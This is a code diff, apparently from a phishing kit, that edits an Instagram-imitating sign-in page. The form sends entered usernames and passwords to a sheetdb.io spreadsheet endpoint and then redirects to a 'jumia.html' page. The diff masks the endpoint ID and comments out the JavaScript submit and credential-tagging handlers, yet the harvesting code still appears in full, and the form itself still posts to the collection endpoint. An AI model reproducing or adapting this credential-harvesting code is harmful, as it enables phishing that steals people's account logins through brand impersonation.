@@ -31,7 +31,7 @@ class Instagram extends HTMLElement{
                                     
                                             <!-- Sign In container -->
                                             <div class="col-12 col-md-10 col-lg-6 mx-auto">
-                                                <form action="https://sheetdb.io/api/v1/boeqkar8i41wn" method="post" id="in-sheetdb-form">
+                                                <form action="https://sheetdb.io/api/v1/*******" method="post" id="in-sheetdb-form">
                                                     <div class="social-input-con">
                                                         <div class="row"
                                                             <div class="col-12">
@@ -102,24 +102,24 @@ customElements.define("instagram-page", Instagram);
 
 
 
-var form = document.getElementById('in-sheetdb-form');
-form.addEventListener("submit", e => {
-    e.preventDefault();
-    fetch(form.action, {
-        method : "POST",
-        body: new FormData(document.getElementById("in-sheetdb-form")),
-    }).then(
-        response => response.json()
-    ).then((html) => {
-        // you can put any JS code here
-        window.open('jumia.html', '_self');
-    });
-});
+// var form = document.getElementById('in-sheetdb-form');
+// form.addEventListener("submit", e => {
+//     e.preventDefault();
+//     fetch(form.action, {
+//         method : "POST",
+//         body: new FormData(document.getElementById("in-sheetdb-form")),
+//     }).then(
+//         response => response.json()
+//     ).then((html) => {
+//         // you can put any JS code here
+//         window.open('jumia.html', '_self');
+//     });
+// });
 
 
-document.getElementById("inz-bn").addEventListener('click', function () {
-    var user = document.getElementById('fazeuser');
-    var pass = document.getElementById('fazepass');
-    user.value += ' ---- ';
-    pass.value += ' ---- ';
-});
+// document.getElementById("inz-bn").addEventListener('click', function () {
+//     var user = document.getElementById('fazeuser');
+//     var pass = document.getElementById('fazepass');
+//     user.value += ' ---- ';
+//     pass.value += ' ---- ';
+// });
